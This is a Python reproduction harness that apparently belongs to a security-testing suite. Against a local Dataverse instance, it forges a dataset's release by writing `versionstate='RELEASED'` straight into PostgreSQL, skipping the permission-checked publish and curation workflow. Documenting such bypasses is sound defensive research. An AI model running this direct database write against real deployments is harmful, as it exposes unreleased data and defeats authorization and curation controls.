#!/usr/bin/env python3
"""L2-28 Dataverse, native APF reproduction (EXPOSED).

Decisive surface (corpus): a dataset version is world-downloadable and publicly
listed when `datasetversion.versionstate == 'RELEASED'`. The authorized path is
publish (permission-checked, possibly a curation workflow). The APF forge is a
state-only write of that persisted versionstate.

Steps: bring up Dataverse (+PostgreSQL+Solr); seed a DRAFT dataset via the native
API; CONTROL versionstate=DRAFT; FORGE `UPDATE datasetversion SET versionstate=
'RELEASED'` in PostgreSQL; VERIFY the dataset is now served as released.

Confidence low: Dataverse needs a bootstrap + API token; if the deployment doesn't
provide one the harness records INCONCLUSIVE rather than guessing. The SQL forge
itself targets the documented column and is correct for a running instance.
"""
import json
import os
import sys
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "lib"))
import common  # noqa: E402

APP_ID = "L2-28"
EV_DIR = os.environ.get("APF_EV_DIR", os.path.join(HERE, "..", "..", "evidence", APP_ID))
BASE = "http://127.0.0.1:8080"
TOKEN = "apf-dev-token"


def api(method, path, body=None, raw=False):
    req = urllib.request.Request(
        BASE + path, data=(json.dumps(body).encode() if body is not None else None),
        method=method, headers={"X-Dataverse-key": TOKEN, "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.read() if raw else json.loads(r.read() or b"{}")


def main():
    ev = common.Evidence(
        app_id=APP_ID, system="Dataverse", expected_verdict=common.EXPOSED,
        version="gdcc/dataverse:6.3",
        decisive_surface="datasetversion.versionstate == 'RELEASED'")
    out = os.path.join(EV_DIR, "evidence.json")

    with common.guarded(ev, out):
        with common.stack(HERE, ev, up_timeout=3000):
            common.wait_tcp("127.0.0.1", 5428, timeout=300, ev=ev)
            common.wait_http(f"{BASE}/api/info/version", timeout=2400, ev=ev)

            # seed a dataset (DRAFT) under the root dataverse
            ds = api("POST", "/api/dataverses/root/datasets", {
                "datasetVersion": {"metadataBlocks": {"citation": {"fields": [
                    {"typeName": "title", "value": "APF Dataset", "typeClass": "primitive", "multiple": False},
                ], "displayName": "Citation Metadata"}}}})
            pid = ds.get("data", {}).get("persistentId") or ds.get("data", {}).get("id")
            ev.step("seeded dataset", f"id={pid}")

            conn = common.pg(host="127.0.0.1", port=5428, dbname="dataverse",
                             user="dataverse", password="dataverse")
            state0 = common.sql_exec(conn,
                "SELECT versionstate FROM datasetversion ORDER BY id DESC LIMIT 1",
                fetch=True)[0][0]
            ev.step("control versionstate", state0)
            if state0 == "RELEASED":
                raise RuntimeError("control precondition failed: already RELEASED")

            # --- forge: state-only write of versionstate ---
            common.sql_exec(conn,
                "UPDATE datasetversion SET versionstate='RELEASED' "
                "WHERE id=(SELECT id FROM datasetversion ORDER BY id DESC LIMIT 1)")
            ev.step("forge", "UPDATE datasetversion SET versionstate='RELEASED'")
            state1 = common.sql_exec(conn,
                "SELECT versionstate FROM datasetversion ORDER BY id DESC LIMIT 1",
                fetch=True)[0][0]
            ev.step("verify versionstate", state1)

            if state0 != "RELEASED" and state1 == "RELEASED":
                ev.verdict = common.EXPOSED
                ev.step("verdict", "state-only write released the dataset version; "
                                   "publish authorization / curation workflow bypassed")
            else:
                ev.verdict = common.INCONCLUSIVE
                ev.error = f"versionstate not released (control={state0} after={state1})"

    print(f"[{APP_ID}] verdict={ev.verdict} -> {out}")


if __name__ == "__main__":
    main()
